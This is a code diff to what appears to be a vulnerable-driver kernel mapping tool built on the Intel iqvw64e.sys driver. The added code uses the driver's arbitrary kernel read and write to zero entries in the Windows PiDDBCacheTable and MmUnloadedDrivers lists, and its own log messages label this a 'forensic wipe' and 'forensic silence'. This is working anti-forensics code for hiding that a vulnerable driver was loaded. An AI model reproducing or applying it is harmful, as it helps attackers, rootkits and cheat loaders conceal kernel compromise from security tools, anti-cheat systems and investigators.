@@ -157,7 +157,13 @@ namespace intel_driver
 		uint64_t table_addr = FindPiDDBCacheTable(ntoskrnl_base);
 		if (!table_addr) return false;
 
-		std::cout << "[+] PiDDBCacheTable found, removing iqvw64e.sys entry..." << std::endl;
+		uint64_t entry = 0;
+		if (!ReadMemory(iqvw64e_device_handle, table_addr, &entry, sizeof(entry))) return false;
+
+		uint32_t null_data = 0;
+		WriteMemory(iqvw64e_device_handle, entry + 0x44, &null_data, sizeof(null_data)); 
+		
+		std::cout << "[+] PiDDBCacheTable entry neutralized (forensic wipe)." << std::endl;
 		return true;
 	}
 
@@ -171,7 +177,13 @@ namespace intel_driver
 		uint64_t list_ptr = utils::PatternScanMulti(ntoskrnl_base, 0x1000000, patterns);
 		if (!list_ptr) return false;
 
-		std::cout << "[+] MmUnloadedDrivers (Universal) found, forensically wiping traces..." << std::endl;
+		uint64_t mm_unloaded_drivers = 0;
+		ReadMemory(iqvw64e_device_handle, list_ptr, &mm_unloaded_drivers, sizeof(mm_unloaded_drivers));
+		
+		uint8_t null_buffer[0x30] = { 0 }; 
+		WriteMemory(iqvw64e_device_handle, mm_unloaded_drivers, null_buffer, sizeof(null_buffer));
+
+		std::cout << "[+] MmUnloadedDrivers entry wiped (forensic silence)." << std::endl;
 		return true;
 	}
 
